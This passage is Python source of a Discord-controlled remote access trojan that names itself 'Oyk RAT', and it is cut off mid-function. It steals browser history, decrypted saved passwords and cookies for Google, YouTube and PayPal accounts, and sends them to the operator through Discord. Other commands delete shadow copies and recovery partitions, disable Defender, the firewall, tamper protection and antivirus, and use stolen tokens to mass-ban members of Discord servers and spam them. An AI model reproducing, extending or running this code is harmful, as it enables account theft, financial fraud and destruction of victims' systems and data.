        "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default\\History",
        "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\History",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
        "Opera": ROAMING + "\\Opera Software\\Opera Stable\\History",
        "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable\\History",
        "Vivaldi": LOCAL + "\\Vivaldi\\User Data\\Default\\History",
        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default\\History",
        "Epic": LOCAL + "\\Epic Privacy Browser\\User Data\\Default\\History",
        "Torch": LOCAL + "\\Torch\\User Data\\Default\\History",
        "7Star": LOCAL + "\\7Star\\7Star\\User Data\\Default\\History",
        "Iridium": LOCAL + "\\Iridium\\User Data\\Default\\History",
        "Kometa": LOCAL + "\\Kometa\\User Data\\Default\\History",
        "Orbitum": LOCAL + "\\Orbitum\\User Data\\Default\\History",
        "CentBrowser": LOCAL + "\\CentBrowser\\User Data\\Default\\History",
        "Amigo": LOCAL + "\\Amigo\\User Data\\Default\\History",
        "Uran": LOCAL + "\\uCozMedia\\Uran\\User Data\\Default\\History",
        "Sputnik": LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default\\History",
        "Firefox": ROAMING + "\\Mozilla\\Firefox\\Profiles"
    }

    def fetch_chrome_edge_history(path):
        history_list = []
        if not os.path.exists(path):
            return history_list
        try:
            temp_path = path + "_copy"
            shutil.copy2(path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for url, title, last_visit in cursor.fetchall():
                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                history_list.append(f"{timestamp} | {title} | {url}")
            conn.close()
            os.remove(temp_path)
        except:
            pass
        return history_list

    def fetch_firefox_history(profile_dir):
        history_list = []
        if not os.path.exists(profile_dir):
            return history_list
        for folder in os.listdir(profile_dir):
            db_path = os.path.join(profile_dir, folder, "places.sqlite")
            if not os.path.exists(db_path):
                continue
            try:
                temp_path = db_path + "_copy"
                shutil.copy2(db_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                for url, title, last_visit in cursor.fetchall():
                    if last_visit:
                        timestamp = datetime(1970, 1, 1) + timedelta(microseconds=last_visit)
                    else:
                        timestamp = "N/A"
                    history_list.append(f"{timestamp} | {title} | {url}")
                conn.close()
                os.remove(temp_path)
            except:
                continue
        return history_list

    all_history = {}
    for browser, path in BROWSERS.items():
        if browser == "Firefox":
            all_history[browser] = fetch_firefox_history(path)
        else:
            all_history[browser] = fetch_chrome_edge_history(path)

    for browser, history in all_history.items():
        if not history:
            embed_empty = discord.Embed(title=f"🟦 {browser} History", description="No history found.", color=discord.Color.blue())
            await interaction.response.send_message(embed=embed_empty, ephemeral=True)
            continue

        embed = discord.Embed(title=f"🟦 {browser} Browser History", color=discord.Color.blue())
        embed.description = "\n".join(history[:10]) if history else "No history found."
        await interaction.response.send_message(embed=embed, ephemeral=True)

        txt_path = Path(f"{browser}_history.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(history))
        await interaction.followup.send(file=discord.File(txt_path), ephemeral=True)
        os.remove(txt_path)

@bot.tree.command(name="disable_recovery_agents_v2", description="Disable all recovery Agents.")
async def disable_reagentc_v2(interaction: discord.Interaction):
    img_url = "https://files.catbox.moe/wt8tme.gif"
    await interaction.response.send_message(
        "⚠️ Are you sure you want to **DISABLE** all recovery environments? React with 💀 to confirm or 🔴 to cancel.",
        ephemeral=True
    )

    confirm_message = await interaction.original_response()
    await confirm_message.add_reaction("💀")
    await confirm_message.add_reaction("🔴")

    def check(reaction, user):
        return user == interaction.user and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_message.id

    reaction, user = await bot.wait_for("reaction_add", check=check)

    if str(reaction.emoji) == "💀":

        def disable_all_recovery_envs():
            results = []

            try:
                winre = subprocess.run(["reagentc", "/disable"], capture_output=True, text=True, shell=True)
                results.append(("Windows Recovery Environment", "🟢 Disabled" if winre.returncode == 0 else f"⚠️ {winre.stderr.strip()}"))
            except Exception as e:
                results.append(("Windows Recovery Environment", f"❌ Error: {e}"))

            try:
                sysrestore = subprocess.run(["powershell", "-Command", "Disable-ComputerRestore -Drive 'C:\\'"], capture_output=True, text=True, shell=True)
                results.append(("System Restore", "🟢 Disabled" if sysrestore.returncode == 0 else f"⚠️ {sysrestore.stderr.strip()}"))
            except Exception as e:
                results.append(("System Restore", f"❌ Error: {e}"))

            try:
                bcd = subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "no"], capture_output=True, text=True, shell=True)
                results.append(("BCD Recovery Entries", "🟢 Disabled" if bcd.returncode == 0 else f"⚠️ {bcd.stderr.strip()}"))
            except Exception as e:
                results.append(("BCD Recovery Entries", f"❌ Error: {e}"))

            try:
                safemode = subprocess.run(["bcdedit", "/deletevalue", "{current}", "safeboot"], capture_output=True, text=True, shell=True)
                results.append(("Safe Mode Boot Option", "🟢 Disabled" if safemode.returncode == 0 else "⚠️ Not present or cannot disable"))
            except Exception as e:
                results.append(("Safe Mode Boot Option", f"❌ Error: {e}"))

            try:
                oemreset = subprocess.run(["powershell", "-Command", "Get-Partition | Where-Object { $_.Type -eq 'Recovery' } | Remove-Partition -Confirm:$false"], capture_output=True, text=True, shell=True)
                results.append(("OEM Recovery Partition", "🟢 Disabled/Removed" if oemreset.returncode == 0 else "⚠️ Not removed or not present"))
            except Exception as e:
                results.append(("OEM Recovery Partition", f"❌ Error: {e}"))

            try:
                vss = subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, text=True, shell=True)
                results.append(("Volume Shadow Copies", "🟢 Disabled" if vss.returncode == 0 else f"⚠️ {vss.stderr.strip()}"))
            except Exception as e:
                results.append(("Volume Shadow Copies", f"❌ Error: {e}"))

            try:
                bitlocker = subprocess.run(["manage-bde", "-protectors", "-disable", "C:"], capture_output=True, text=True, shell=True)
                results.append(("BitLocker Recovery", "🟢 Disabled" if bitlocker.returncode == 0 else f"⚠️ {bitlocker.stderr.strip()}"))
            except Exception as e:
                results.append(("BitLocker Recovery", f"❌ Error: {e}"))

            try:
                startuprepair = subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "no"], capture_output=True, text=True, shell=True)
                results.append(("Automatic / Startup Repair", "🟢 Disabled" if startuprepair.returncode == 0 else f"⚠️ {startuprepair.stderr.strip()}"))
            except Exception as e:
                results.append(("Automatic / Startup Repair", f"❌ Error: {e}"))

            try:
                crash = subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl", "/v", "AutoReboot", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True, text=True, shell=True)
                results.append(("Crash Recovery / Memory Dump", "🟢 Auto-restart disabled" if crash.returncode == 0 else f"⚠️ {crash.stderr.strip()}"))
            except Exception as e:
                results.append(("Crash Recovery / Memory Dump", f"❌ Error: {e}"))

            try:
                hiber = subprocess.run(["powercfg", "/hibernate", "off"], capture_output=True, text=True, shell=True)
                results.append(("Hibernation / Fast Startup", "🟢 Disabled" if hiber.returncode == 0 else f"⚠️ {hiber.stderr.strip()}"))
            except Exception as e:
                results.append(("Hibernation / Fast Startup", f"❌ Error: {e}"))

            backup_tasks = [
                r"\Microsoft\Windows\WindowsBackup\AutomaticBackup",
                r"\Microsoft\Windows\WindowsBackup\ScheduledBackup"
            ]
            for task in backup_tasks:
                try:
                    sched = subprocess.run(["schtasks", "/Change", "/TN", task, "/DISABLE"], capture_output=True, text=True, shell=True)
                    results.append((f"Scheduled Backup Task: {task}", "🟢 Disabled" if sched.returncode == 0 else f"⚠️ {sched.stderr.strip()}"))
                except Exception as e:
                    results.append((f"Scheduled Backup Task: {task}", f"❌ Error: {e}"))

            return results

        results = disable_all_recovery_envs()
        for name, status in results:
            embed = discord.Embed(title=f"🟣 Successfully Disabled {name}.", description=status, color=0x800080)
            embed.set_footer(text="Disabled Recovery Agents • by L.A nutgzz")
            embed.set_image(url=img_url)
            await interaction.followup.send(embed=embed)
    else:
        await interaction.followup.send("❌ Operation cancelled.", ephemeral=True)

@bot.tree.command(name="disable_vms", description="Disable all VMs and virtualization features")
async def disable_vms(interaction: discord.Interaction):
    img_url = "https://files.catbox.moe/wt8tme.gif"

    await interaction.response.send_message("Disabling all detected VMs and virtualization features...", ephemeral=True)

    def fast_disable_vms():
        results = []

        services = subprocess.run(
            ["powershell", "-Command", "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, shell=True
        ).stdout.lower().splitlines()

        vm_services = ["vmms", "vmwarehostd", "vboxsvc", "vboxnetdhcp", "vboxweb-service"]
        for svc in vm_services:
            if svc.lower() in services:
                try:
                    subprocess.run(["powershell", "-Command", f"Stop-Service -Name {svc} -Force"], capture_output=True, text=True, shell=True)
                    results.append((f"{svc} Service", "🟢 Stopped"))
                except:
                    results.append((f"{svc} Service", "❌ Failed"))
            else:
                results.append((f"{svc} Service", "⚠️ Not running"))

        features = {
            "Containers-DisposableClientVM": "Windows Sandbox",
            "VirtualMachinePlatform": "Virtual Machine Platform",
            "Microsoft-Windows-Subsystem-Linux": "WSL (Linux Subsystem)",
            "Windows-Defender-ApplicationGuard": "Windows Defender Application Guard",
            "Microsoft-Hyper-V-All": "Hyper-V Optional Features",
            "Containers": "Windows Containers",
            "HypervisorPlatform": "Hypervisor Platform"
        }
        for feat, name in features.items():
            try:
                check_feat = subprocess.run([
                    "powershell", "-Command",
                    f"Get-WindowsOptionalFeature -Online | Where-Object {{$_.FeatureName -eq '{feat}'}} | Select-Object State"
                ], capture_output=True, text=True, shell=True)
                if "Enabled" in check_feat.stdout:
                    subprocess.run([
                        "powershell", "-Command",
                        f"Disable-WindowsOptionalFeature -FeatureName '{feat}' -Online -NoRestart"
                    ], capture_output=True, text=True, shell=True)
                    results.append((name, "🟢 Disabled"))
                else:
                    results.append((name, "⚠️ Not enabled"))
            except:
                results.append((name, "❌ Error"))

        try:
            dg_check = subprocess.run([
                "powershell", "-Command",
                "(Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard' -Name EnableVirtualizationBasedSecurity).EnableVirtualizationBasedSecurity"
            ], capture_output=True, text=True, shell=True)
            if "1" in dg_check.stdout:
                subprocess.run([
                    "powershell", "-Command",
                    "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard' -Name 'EnableVirtualizationBasedSecurity' -Value 0; "
                    "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity' -Name 'Enabled' -Value 0"
                ], capture_output=True, text=True, shell=True)
                results.append(("Device Guard / Credential Guard", "🟢 Disabled"))
            else:
                results.append(("Device Guard / Credential Guard", "⚠️ Not enabled"))
        except:
            results.append(("Device Guard / Credential Guard", "❌ Error"))

        try:
            mem_check = subprocess.run([
                "powershell", "-Command",
                "(Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity' -Name Enabled).Enabled"
            ], capture_output=True, text=True, shell=True)
            if "1" in mem_check.stdout:
                subprocess.run([
                    "powershell", "-Command",
                    "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity' -Name 'Enabled' -Value 0"
                ], capture_output=True, text=True, shell=True)
                results.append(("Memory Integrity / Core Isolation", "🟢 Disabled"))
            else:
                results.append(("Memory Integrity / Core Isolation", "⚠️ Not enabled"))
        except:
            results.append(("Memory Integrity / Core Isolation", "❌ Error"))

        vm_detect_cmds = {
            "QEMU/KVM": "Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model | Out-String",
            "Parallels": "Get-WmiObject Win32_BIOS | Select-Object SerialNumber, Manufacturer | Out-String",
            "VirtualBox": "Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer | Out-String",
            "VMware": "Get-WmiObject Win32_BIOS | Select-Object Manufacturer | Out-String",
        }
        for vm_name, cmd in vm_detect_cmds.items():
            try:
                detect = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, shell=True)
                if detect.returncode == 0 and vm_name.lower() in detect.stdout.lower():
                    results.append((vm_name, "🟢 Detected"))
                else:
                    results.append((vm_name, "⚠️ Not detected"))
            except:
                results.append((vm_name, "❌ Detection Error"))

        return results

    results = fast_disable_vms()
    for name, status in results:
        embed = discord.Embed(title=f"🟣 Disabled {name} Successfully.", description=status, color=0x800080)
        embed.set_footer(text="Disabled VMs. • by L.A nutgzz thanks for using Oyk RAT.")
        embed.set_image(url=img_url)
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="destroyer", description="all-in-one disabler & destroyer: security, recovery, VMs, antivirus")
async def destroyer(interaction: discord.Interaction):
    img_url = "https://files.catbox.moe/wt8tme.gif"
    await interaction.response.send_message("Disabling: security, recovery, VMs, antivirus...", ephemeral=True)

    def ultimate_disable():
        results = []

        security_features = {
            "WindowsDefender": "Windows Defender Antivirus",
            "WindowsDefenderFirewall": "Windows Firewall",
            "SmartScreen": "SmartScreen Filter",
            "ControlledFolderAccess": "Controlled Folder Access / Ransomware Protection",
            "CloudProtection": "Cloud-delivered Protection",
            "TamperProtection": "Tamper Protection",
            "WDATP": "Windows Defender ATP / Security Center",
            "ExploitProtection": "Exploit Protection / ASR Rules",
            "MemoryIntegrity": "Memory Integrity / Core Isolation",
            "WindowsUpdate": "Windows Update Service"
        }

        for feat, name in security_features.items():
            try:
                if feat == "WindowsDefender":
                    subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], capture_output=True, text=True, shell=True)
                elif feat == "WindowsDefenderFirewall":
                    subprocess.run(["powershell", "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"], capture_output=True, text=True, shell=True)
                elif feat == "SmartScreen":
                    subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer' -Name SmartScreenEnabled -Value Off"], capture_output=True, text=True, shell=True)
                elif feat == "ControlledFolderAccess":
                    subprocess.run(["powershell", "-Command", "Set-MpPreference -EnableControlledFolderAccess Disabled"], capture_output=True, text=True, shell=True)
                elif feat == "CloudProtection":
                    subprocess.run(["powershell", "-Command", "Set-MpPreference -MAPSReporting Disabled; Set-MpPreference -SubmitSamplesConsent NeverSend"], capture_output=True, text=True, shell=True)
                elif feat == "TamperProtection":
                    subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name 'TamperProtection' -Value 0"], capture_output=True, text=True, shell=True)
                elif feat == "WDATP":
                    subprocess.run(["powershell", "-Command", "Stop-Service -Name 'Sense' -Force"], capture_output=True, text=True, shell=True)
                elif feat == "ExploitProtection":
                    subprocess.run(["powershell", "-Command", "Set-ProcessMitigation -System -Enable DEP,ASLR,SEHOP -Disable"], capture_output=True, text=True, shell=True)
                elif feat == "MemoryIntegrity":
                    subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity' -Name 'Enabled' -Value 0"], capture_output=True, text=True, shell=True)
                elif feat == "WindowsUpdate":
                    subprocess.run(["powershell", "-Command", "Stop-Service -Name 'wuauserv' -Force"], capture_output=True, text=True, shell=True)
                results.append((name, "🟢 Disabled"))
            except:
                results.append((name, "❌ Failed"))

        recovery_cmds = {
            "WinRE": ["reagentc", "/disable"],
            "SystemRestore": ["powershell", "-Command", "Disable-ComputerRestore -Drive 'C:\\'"],
            "SafeModeBoot": ["bcdedit", "/set", "{current}", "safeboot", "minimal"],
            "OEMFactoryReset": ["powershell", "-Command", "Remove-Item -Path 'C:\\FactoryReset' -Recurse -Force"]
        }

        for name, cmd in recovery_cmds.items():
            try:
                subprocess.run(cmd, capture_output=True, text=True, shell=True)
                results.append((f"Recovery: {name}", "🟢 Disabled"))
            except:
                results.append((f"Recovery: {name}", "❌ Failed"))

        vm_cmds = {
            "HyperV": ["powershell", "-Command", "Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -NoRestart"],
            "VMware": ["powershell", "-Command", "Stop-Service -Name vmware"], 
            "VirtualBox": ["powershell", "-Command", "Stop-Service -Name vboxdrv"],
            "QEMU": ["powershell", "-Command", "Stop-Process -Name qemu-system* -Force"]
        }

        for name, cmd in vm_cmds.items():
            try:
                subprocess.run(cmd, capture_output=True, text=True, shell=True)
                results.append((f"VM: {name}", "🟢 Disabled"))
            except:
                results.append((f"VM: {name}", "❌ Failed"))

        try:
            av_services = subprocess.run(
                ["powershell", "-Command", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"],
                capture_output=True, text=True, shell=True
            )
            if av_services.stdout.strip():
                for av in av_services.stdout.strip().splitlines():
                    try:
                        subprocess.run(["powershell", "-Command", f"Stop-Service -Name '{av}' -Force"], capture_output=True, text=True, shell=True)
                        results.append((f"{av} Antivirus", "🟢 Service Disabled"))
                    except:
                        results.append((f"{av} Antivirus", "❌ Failed to disable"))
            else:
                results.append(("Third-party Antivirus", "⚠️ No AV services detected"))
        except:
            results.append(("Third-party Antivirus", "❌ Error detecting AV services"))

        return results

    results = ultimate_disable()
    for name, status in results:
        embed = discord.Embed(title=f"🟣 Successfully Disabled {name}", description=status, color=0x800080)
        embed.set_footer(text="Destroyer • By L.A nutgzz Thanks for using Oyk Rat.")
        embed.set_image(url=img_url)
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="server-nuker", description="nuker")
async def server_nuker(
    interaction: discord.Interaction,
    user_tokens: str,
    bot_tokens: str,
    bot_invites: str,
    new_channel_count: int = 1
):
    await interaction.response.send_message("nuking servers...", ephemeral=True)

    user_tokens_list = [t.strip() for t in user_tokens.split(",")]
    bot_tokens_list = [t.strip() for t in bot_tokens.split(",")]
    bot_invites_list = [i.strip() for i in bot_invites.split(",")]
    embed_log = discord.Embed(title="log", color=0x800080)

    def thread_request(func, *args, **kwargs):
        return asyncio.to_thread(func, *args, **kwargs)

    async def bot_actions(bot_token):
        headers = {"Authorization": bot_token, "Content-Type": "application/json"}

        def get_admin_guilds():
            try:
                r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
                guilds = r.json()
                return [g for g in guilds if int(g.get("permissions",0)) & 0x8]
            except:
                return []

        async def process_guild(guild):
            guild_id = guild["id"]
            guild_name = guild["name"]

            try:
                r_members = await thread_request(lambda: requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers))
                members = r_members.json()
                for m in members:
                    if 'user' in m:
                        await thread_request(lambda: requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/bans/{m['user']['id']}", headers=headers))
                embed_log.add_field(name="Members Banned", value=f"✅ All members banned in {guild_name}", inline=False)
            except:
                embed_log.add_field(name="Members Banned", value=f"❌ Failed in {guild_name}", inline=False)

            try:
                r_channels = await thread_request(lambda: requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers))
                channels = r_channels.json()
                for ch in channels:
                    await thread_request(lambda: requests.delete(f"https://discord.com/api/v10/channels/{ch['id']}", headers=headers))
                embed_log.add_field(name="Channels Deleted", value=f"✅ All channels deleted in {guild_name}", inline=False)
            except:
                embed_log.add_field(name="Channels Deleted", value=f"❌ Failed in {guild_name}", inline=False)

            new_channels = []
            for i in range(new_channel_count):
                try:
                    r = await thread_request(lambda: requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json={"name": "nuked-by-nutgzz"}))
                    ch_id = r.json().get("id")
                    if ch_id:
                        new_channels.append(ch_id)
                        await thread_request(lambda: requests.post(f"https://discord.com/api/v10/channels/{ch_id}/webhooks", headers=headers, json={"name":"nut"}))
                except:
                    continue
            embed_log.add_field(name="Channels Created", value=f"✅ {len(new_channels)} channels created in {guild_name}", inline=False)

            try:
                r_roles = await thread_request(lambda: requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers=headers))
                roles = r_roles.json()
                for role in roles:
                    if role['name'] == '@everyone':
                        await thread_request(lambda: requests.patch(
                            f"https://discord.com/api/v10/guilds/{guild_id}/roles/{role['id']}",
                            headers=headers,
                            json={"permissions": 8}
                        ))
                embed_log.add_field(name="@everyone Admin", value=f"✅ @everyone granted Administrator in {guild_name}", inline=False)
            except:
                embed_log.add_field(name="@everyone Admin", value=f"❌ Failed to grant @everyone Admin in {guild_name}", inline=False)

            try:
                await thread_request(lambda: requests.patch(f"https://discord.com/api/v10/guilds/{guild_id}", headers=headers, json={"preferred_locale": "en-US", "features": []}))
                embed_log.add_field(name="Community Disabled", value=f"✅ Community features disabled in {guild_name}", inline=False)
            except:
                embed_log.add_field(name="Community Disabled", value=f"❌ Failed in {guild_name}", inline=False)

            def spam_webhook(hook_url):
                while True:
                    try:
                        requests.post(hook_url, json={"content": "@everyone **OMG**"})
                    except:
                        continue

            for ch_id in new_channels:
                hooks = await thread_request(lambda: requests.get(f"https://discord.com/api/v10/channels/{ch_id}/webhooks", headers=headers).json())
                for hook in hooks:
                    hook_url = f"https://discord.com/api/v10/webhooks/{hook['id']}/{hook['token']}"
                    executor.submit(spam_webhook, hook_url)

            def kick_existing_bots():
                while True:
                    try:
                        r_members = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers).json()
                        for m in r_members:
                            if 'user' in m and m['user']['bot'] and m['user']['id'] != bot.user.id:
                                requests.delete(f"https://discord.com/api/v10/guilds/{guild_id}/members/{m['user']['id']}", headers=headers)
                    except:
                        continue
            executor.submit(kick_existing_bots)

        guilds = await thread_request(get_admin_guilds)
        tasks = [process_guild(g) for g in guilds]
        await asyncio.gather(*tasks)

    async def user_invite_bots():
        for token in user_tokens_list:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            for invite in bot_invites_list:
                try:
                    await thread_request(lambda: requests.post(invite, headers=headers))
                    embed_log.add_field(name="Bot Invite", value=f"✅ Bot invited using user token", inline=False)
                except:
                    embed_log.add_field(name="Bot Invite", value=f"❌ Failed bot invite using token", inline=False)

    await user_invite_bots()
    for token in bot_tokens_list:
        asyncio.create_task(bot_actions(token))

    await interaction.followup.send(embed=embed_log)

@tasks.loop(seconds=2)
async def check_new_bots():
    for guild in bot.guilds:
        for member in guild.members:
            if member.bot and member != bot.user:
                try:
                    await member.kick(reason=".")
                except:
                    continue

@bot.tree.command(name="set-volume", description="Set PC volume (0-100)")
async def set_volume(interaction: discord.Interaction, volume: int):
    if volume < 0 or volume > 100:
        await interaction.response.send_message("Volume must be between 0 and 100.", ephemeral=True)
        return

    try:
        def set_system_volume(vol: int):
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_ctrl = cast(interface, POINTER(IAudioEndpointVolume))
            volume_ctrl.SetMasterVolumeLevelScalar(vol / 100.0, None)

        set_system_volume(volume)

        embed = discord.Embed(
            title="🟣 System Volume Set",
            description=f"🔊 PC system volume has been set to **{volume}%**",
            color=0x800080
        )
        await interaction.response.send_message(embed=embed)

    except Exception as e:
        await interaction.response.send_message(f"❌ Failed to set volume: {e}", ephemeral=True)

@bot.tree.command(name="grab-yt", description="Grab full YouTube/Gmail account info including cookies, subscribers, uploads, thumbnail, phone numbers, linked accounts, sessions")
async def grab_yt(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    PATHS = {
        "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    }

    def decrypt_password(encrypted: bytes) -> str:
        try:
            return CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
        except:
            return "Could not decrypt"

    accounts = []
    cookies_text = ""

    for browser, path in PATHS.items():
        login_db = os.path.join(path, "Login Data")
        if os.path.exists(login_db):
            try:
                conn = sqlite3.connect(login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cursor.fetchall():
                    pwd_dec = decrypt_password(pwd)
                    if "youtube.com" in url.lower() or "google.com" in url.lower():
                        accounts.append({
                            "browser": browser,
                            "url": url,
                            "username": user,
                            "password": pwd_dec
                        })
                conn.close()
            except:
                continue

        cookies_db = os.path.join(path, "Network", "Cookies")
        if os.path.exists(cookies_db):
            try:
                conn = sqlite3.connect(cookies_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies")
                for host, name, value in cursor.fetchall():
                    if "youtube.com" in host.lower() or "google.com" in host.lower():
                        cookies_text += f"{host} | {name} = {value}\n"
                conn.close()
            except:
                continue

    if cookies_text:
        cookies_file = os.path.join(LOCAL, "youtube_gmail_cookies.txt")
        with open(cookies_file, "w", encoding="utf-8") as f:
            f.write(cookies_text)

    if not accounts:
        embed_empty = Embed(
            title="🟣 YouTube & Gmail Accounts",
            description="No accounts found.",
            color=0x8000FF
        )
        await interaction.response.send_message(embed=embed_empty, ephemeral=True)
        return

    for i, acc in enumerate(accounts, start=1):
        yt_username = acc["username"]
        yt_password = acc["password"]
        channel_info = {}
        recovery_emails = []
        backup_codes = []
        phone_numbers = []
        linked_accounts = []
        session_tokens = []

        try:
            cookies = {"LOGIN_INFO": yt_password}
            r = requests.get(
                "https://www.googleapis.com/youtube/v3/channels?part=statistics,snippet,contentDetails&mine=true",
                cookies=cookies
            )
            if r.ok:
                data = r.json()
                if "items" in data and len(data["items"]) > 0:
                    item = data["items"][0]
                    stats = item.get("statistics", {})
                    snippet = item.get("snippet", {})
                    channel_info = {
                        "subscribers": stats.get("subscriberCount", "N/A"),
                        "uploads": stats.get("videoCount", "N/A"),
                        "thumbnail": snippet.get("thumbnails", {}).get("default", {}).get("url", ""),
                        "creation_date": snippet.get("publishedAt", "N/A")
                    }

            resp = requests.get(
                "https://myaccount.google.com/api/userinfo",
                cookies={"LOGIN_INFO": yt_password},
                timeout=5
            )
            if resp.ok:
                data = resp.json()
                recovery_emails = data.get("recoveryEmails", [])
                backup_codes = data.get("backupCodes", [])
                phone_numbers = data.get("phoneNumbers", [])
                linked_accounts = data.get("linkedAccounts", [])
                session_tokens = data.get("sessions", [])

        except:
            channel_info = {"subscribers": "N/A", "uploads": "N/A", "thumbnail": "", "creation_date": "N/A"}
            recovery_emails = []
            backup_codes = []
            phone_numbers = []
            linked_accounts = []
            session_tokens = []

        embed = Embed(
            title=f"🟣 Grabbed Account {i} - {yt_username}",
            color=0x8000FF
        )
        embed.add_field(name="🌐 URL", value=acc["url"], inline=False)
        embed.add_field(name="✉ Username/Email", value=yt_username, inline=True)
        embed.add_field(name="🔑 Password", value=yt_password, inline=True)
        embed.add_field(name="💻 Browser", value=acc["browser"], inline=True)
        embed.add_field(name="👥 Subscribers", value=channel_info.get("subscribers", "N/A"), inline=True)
        embed.add_field(name="🎬 Uploaded Videos", value=channel_info.get("uploads", "N/A"), inline=True)
        embed.add_field(name="🕒 Account Creation Date", value=channel_info.get("creation_date", "N/A"), inline=True)
        embed.add_field(name="📧 Recovery Emails", value="\n".join(recovery_emails) or "None", inline=True)
        embed.add_field(name="🔑 Backup Codes", value="\n".join(backup_codes) or "None", inline=True)
        embed.add_field(name="📱 Phone Numbers", value="\n".join(phone_numbers) or "None", inline=True)
        embed.add_field(name="🔗 Linked Accounts", value="\n".join(linked_accounts) or "None", inline=True)
        embed.add_field(name="🗝️ Sessions", value="\n".join(session_tokens) or "None", inline=True)
        if channel_info.get("thumbnail"):
            embed.set_thumbnail(url=channel_info["thumbnail"])

        await interaction.response.send_message(embed=embed, ephemeral=True)

    if cookies_text:
        await interaction.followup.send(
            content="Cookies saved as `.txt`",
            file=File(cookies_file),
            ephemeral=True
        )

@bot.tree.command(name="grab-paypal", description="Grab PayPal account info including Gmail, tokens, cookies, 2FA, backup codes, balance")
async def grab_paypal(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        "Chrome": LOCAL + "\\Google\\Chrome\\User Data",
        "Edge": LOCAL + "\\Microsoft\\Edge\\User Data",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data",
        "Opera": ROAMING + "\\Opera Software\\Opera Stable",
        "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable",
        "Vivaldi": LOCAL + "\\Vivaldi\\User Data",
        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data",
        "Firefox": ROAMING + "\\Mozilla\\Firefox\\Profiles"
    }

    def decrypt_password(encrypted: bytes) -> str:
        try:
            return CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
        except:
            return "Could not decrypt"

    def get_chrome_logins(path: str):
        accounts = []
        login_db = os.path.join(path, "Default", "Login Data")
        if os.path.exists(login_db):
            try:
                conn = sqlite3.connect(login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cursor.fetchall():
                    accounts.append({
                        "url": url,
                        "gmail_name": user.split("@")[0] if user else "N/A",
                        "username": user,
